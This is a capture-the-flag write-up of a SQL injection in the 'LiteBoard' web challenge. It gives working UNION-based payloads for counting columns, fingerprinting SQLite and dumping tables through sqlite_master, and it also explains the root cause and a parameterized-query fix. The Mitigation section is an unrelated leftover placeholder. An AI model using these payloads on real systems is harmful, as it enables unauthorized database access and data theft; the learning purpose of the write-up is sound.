# [DreamHack Silver] LiteBoard

## Challenge Info

- Platform: DreamHack

- Difficulty: Silver 4

- Category: Web / SQL injection - BDSM fingerprinting

## Summary

- This is a black-box challenge with no source code provided. The `/search` endpoint contains a SQL injetion vulnerability in the `keyword` parameter,

exploitable via a UNION-based attack. The goal is to extract the flag by enumerating the database structure - determining the number of returned columns, identifying table names, and querying the table that contains the flag.

## Analysis

1. Recon (black-box)

   - The site exposes two main endpoints: `/add_post` for submitting messages and `/search?keyword=` for searching posts by keyword. 

2. Locating the vulnerability

   - The `keyword` parameter is directly visible in the URL, which suggested the server executes a query such as `SELECT * FROM posts WHERE content LIKE '%{keyword}%'`.

   To verify this, i injected a single quote(`'`), wihch returned a 500 Internal Error - indicating a syntax error in the query. Injecting `' OR 1=1 --` caused all posts to be returned, confirming the SQL injection vulnerability.

3. Trial and error

   - I confitmed the SQL injection vulnerability but I got stuck at two points during exploitation. First, I couldn't directly verify the database type - instead, I inferred it was SQLite based on the challenge name "LiteBoard".

   Ideally, DBMS fingerprinting: injecting `sqlite_version()` or DB-specific syntax via UNION SELECT to confirm the backend. Second, I was unware that SQLite's metadata table is `sqlite_master` rather than `information_schema`,

   so i look it up before proceeding.

## Final Exploit

1. Determined the number of returned columns using `' ORDER BY N --`

   - error occurred at N=3, confirming 2 columns

2. Identified the reflected column using `' UNION SELECT 1,2 --`

   - confirmed the 2nd column is displayed in the ouput

3. Confirmed the database type using `' UNION SELECT 1,sqlite_version()--`

   - response confirmed SQLite

4. Enumerated table names using `' UNION SELECT 1,name FROM sqlite_master WHERE type='table' --`

   - Discovered: README, sqlite_sequence

5. Retrieved the column structure of README using `' UNION SELECT 1,sql FROM sqlite_master WHERE name='README'--`

   - Revealed 3 columns: `hello`,`light`,`world`

6. Queried each column individually using `' UNION SELECT 1,{column} FROM README--`

   - Reassembled the flag from the three separte values

## Root Cause

- The root cuase is that user input from the `keyword` parameter is directly concatenated into SQL query without any validation or escaping,

allowing an attacker to inject arbitary SQL syntax.

The proper defense is to use **Prepared Statements**(parameterized queries), which treat user input strictly as data and prevent it from being interpreted as SQL syntax.

- Related CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command

```python

# Vulnerable

keyword = request.args["keyword"]

query = "SELECT * FROM posts WHERE content LIKE '%" + keyword + "%'"

```

Attack result:

```sql

-- Input: ' OR 1=1 --

SELECT * FROM posts WHERE content LIKE '%' OR 1=1 --%'

-- → returns all rows

```

Fix:

```python

# Safe: Prepared Statement

query = "SELECT * FROM posts WHERE content LIKE ?"

cursor.execute(query, ("%" + keyword + "%",))

```

## What I Learned

- Learned the structure of SQLite's metadata table 'sqlite_master'

  (key columns: `type`,`name`,`sql`) -> see [concepts/sqli.md](../../../concepts/sqli.md#sqlite-master)

- Learned **DBMS Fingerprinting**: identifying the backend DB by injecting

  DB-specific version functions (`sqlite_version()`,`version()`,`@@version`)

  via UNION SELECT -> see [concept.sqli.md](../../../concepts/sqli.md#dbms-fingerprinting)

## Mitigation

- (defensive side too, not just attacker POV — e.g. scheme whitelist, DNS pinning)

## Flag

`DH{...}`
